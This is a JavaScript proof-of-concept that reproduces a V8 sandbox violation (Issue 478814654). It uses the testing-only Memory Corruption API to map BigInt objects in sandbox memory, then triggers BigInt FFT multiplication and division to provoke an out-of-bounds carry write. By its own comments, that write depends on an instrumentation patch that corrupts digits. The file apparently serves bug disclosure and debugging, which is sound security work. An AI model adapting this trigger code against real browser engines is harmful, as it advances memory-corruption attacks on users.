// V8 Sandbox Escape PoC - Memory Corruption API variant (Issue 478814654)
// ==============================================================================
//
// This PoC uses the Memory Corruption API to:
// 1. Verify sandbox layout
// 2. Find BigInt objects in sandbox memory
// 3. Trigger FFT multiplication with CopyAndZeroExtend corruption
// 4. Detect and report the OOB write
//
// This variant provides more insight into the sandbox memory layout
// and can be used for debugging and verification.
//
// Build:
//   is_asan = true
//   v8_enable_sandbox = true
//   v8_enable_memory_corruption_api = true
//   v8_advanced_bigint_algorithms = true
//
// Run:
//   ./d8 --sandbox-testing poc_sandbox_violation_api.js
//
// Expected:
//   ## V8 sandbox violation detected!

// --- Sandbox Information ---
const sandboxBase = Sandbox.base;
const sandboxSize = Sandbox.byteLength;
const sandboxEnd = sandboxBase + sandboxSize;

print(`Sandbox base: 0x${sandboxBase.toString(16)}`);
print(`Sandbox size: 0x${sandboxSize.toString(16)} (${sandboxSize / (1024*1024*1024)} GB)`);
print(`Sandbox end: 0x${sandboxEnd.toString(16)}`);

// --- Create BigInt objects and find their addresses ---
function createAndInspectBigInt() {
  const x = 123456n;
  const a = 31337n ** x;

  // Get the address of the BigInt object in sandbox
  const addr = Sandbox.getAddressOf(a);
  print(`BigInt object at sandbox offset: 0x${addr.toString(16)}`);

  // Get the size of the BigInt object
  const size = Sandbox.getSizeOf(a);
  print(`BigInt object size: ${size} bytes`);

  // Get instance type
  const type = Sandbox.getInstanceTypeOf(a);
  print(`BigInt instance type: ${type}`);

  return a;
}

// --- Create large BigInt for FFT multiplication ---
print("\nCreating large BigInt values for FFT multiplication...");
const a = createAndInspectBigInt();
const b = 42n ** 123456n;

// Get sandbox address of divisor
const bAddr = Sandbox.getAddressOf(b);
print(`Divisor BigInt at sandbox offset: 0x${bAddr.toString(16)}`);

// --- Use MemoryView to inspect sandbox memory around BigInt ---
print("\nInspecting sandbox memory layout...");
try {
  // Create a view into sandbox memory at the BigInt's location
  const viewOffset = Number(bAddr & 0xFFFFFFFFn) - 256;
  if (viewOffset >= 0 && viewOffset + 512 <= sandboxSize) {
    const view = new Sandbox.MemoryView(viewOffset, 512);
    const dv = new DataView(view);
    print(`MemoryView created at offset 0x${viewOffset.toString(16)}`);
    // Read some bytes to verify the view works
    print(`  First 8 bytes at view: 0x${dv.getBigUint64(0, true).toString(16)}`);
  }
} catch (e) {
  print(`MemoryView creation failed: ${e.message}`);
}

// --- Trigger the OOB write ---
// The CopyAndZeroExtend corruption in the v5 instrumentation patch
// will randomly corrupt ~10% of source digits during FFT multiplication.
// This breaks the mathematical invariant, causing NormalizeAndRecombine
// to produce a non-zero carry at zi == Z.len().
//
// The OOB write Z[zi] = carry goes past the new digit_t[] buffer
// into ASAN redzones. ASAN detects this as heap-buffer-overflow,
// and --sandbox-testing reports it as "## V8 sandbox violation detected!".
print("\nTriggering BigInt division (FFT multiplication path)...");
print("CopyAndZeroExtend corruption will corrupt ~10% of digits...");
print("This should cause NormalizeAndRecombine carry OOB write...");

try {
  const c = a / b;
  print("Division completed (OOB not triggered in this run)");
  print("The corruption is probabilistic. Try running multiple times.");
} catch (e) {
  print(`Exception caught: ${e.message}`);
}

// Try multiplication path too
print("\nTrying multiplication path...");
try {
  const big = (2n ** 46080n) - 1n;
  const result = big * big;
  print("Multiplication completed (OOB not triggered)");
} catch (e) {
  print(`Exception caught: ${e.message}`);
}
